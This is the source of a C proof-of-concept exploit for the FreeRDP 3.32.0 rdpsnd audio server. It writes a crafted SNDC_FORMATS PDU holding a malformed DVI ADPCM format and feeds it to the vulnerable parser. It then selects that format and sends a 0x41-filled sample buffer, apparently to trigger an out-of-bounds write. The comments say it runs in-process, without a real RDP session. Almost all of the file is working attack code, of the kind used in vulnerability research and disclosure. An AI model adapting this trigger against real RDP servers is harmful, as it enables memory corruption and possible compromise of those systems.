/*
 * PocRdpsndWire.c — drives the REAL rdpsnd_server_recv_formats() parser source
 * with a crafted SNDC_FORMATS PDU, then selects the parsed malicious format
 * and calls SendSamples. This is the wire-format parse path of the vulnerable
 * 3.32.0 source, not a re-implementation; it is still in-process (no RDP
 * session, no auth gate, no real virtual-channel transport).
 *
 * Build like the other PoCs but add -I<src>/channels/rdpsnd/common and link
 * -lfreerdp3 too. The #include of rdpsnd_main.c below supplies the static
 * parser and the context constructor; the executable's definitions take
 * precedence over the shared library's.
 */
#include <freerdp/codec/audio.h>
#include <winpr/stream.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static AUDIO_FORMAT fmt_pcm = { WAVE_FORMAT_PCM, 2, 44100, 176400, 4, 16, 0, NULL };
static BYTE dvi_ext[2] = { 0xf9, 0x07 };
static AUDIO_FORMAT fmt_dvi = { WAVE_FORMAT_DVI_ADPCM, 2, 44100, 44251, 4, 4, 2, dvi_ext };

/* Real 3.32.0 server source, including the static recv_formats parser. */
#include "rdpsnd_main.c"

int main(void)
{
    BYTE pdu[512];
    wStream* s = Stream_New(pdu, sizeof pdu);
    setvbuf(stdout, NULL, _IONBF, 0);

    /* SNDC_FORMATS header: dwFlags, dwVolume, dwPitch, wDGramPort,
     * wNumberOfFormats, cLastBlockConfirmed, wVersion, bPad */
    Stream_Write_UINT32(s, 0);       /* dwFlags */
    Stream_Write_UINT32(s, 0xffffffff); /* dwVolume */
    Stream_Write_UINT32(s, 0);       /* dwPitch */
    Stream_Write_UINT16(s, 0);       /* wDGramPort */
    Stream_Write_UINT16(s, 2);       /* two format records */
    Stream_Write_UINT8(s, 0);        /* cLastBlockConfirmed */
    Stream_Write_UINT16(s, 1);       /* wVersion */
    Stream_Write_UINT8(s, 0);        /* bPad */
    audio_format_write(s, &fmt_pcm);
    audio_format_write(s, &fmt_dvi);
    Stream_SetPosition(s, 0);

    RdpsndServerContext* ctx = rdpsnd_server_context_new(NULL);
    ctx->src_format = &fmt_pcm; ctx->latency = 50;
    InitializeCriticalSectionAndSpinCount(&ctx->priv->lock, 4000);

    UINT rc = rdpsnd_server_recv_formats(ctx, s);
    printf("recv_formats rc=%u nformats=%u\n", rc, ctx->num_client_formats);
    if (ctx->num_client_formats >= 2)
        printf("parsed[1]: tag=%u channels=%u blockalign=%u cbsize=%u\n",
               ctx->client_formats[1].wFormatTag, ctx->client_formats[1].nChannels,
               ctx->client_formats[1].nBlockAlign, ctx->client_formats[1].cbSize);

    ctx->SelectFormat(ctx, 0); /* benign PCM allocates the 8820-byte buffer */
    UINT rc2 = ctx->SelectFormat(ctx, 1);
    printf("SelectFormat rc=%u out_frames=0x%016zx\n", rc2, ctx->priv->out_frames);
    BYTE buf[16384]; memset(buf, 0x41, sizeof buf);
    ctx->SendSamples(ctx, buf, 4096, 0);
    return 0;
}
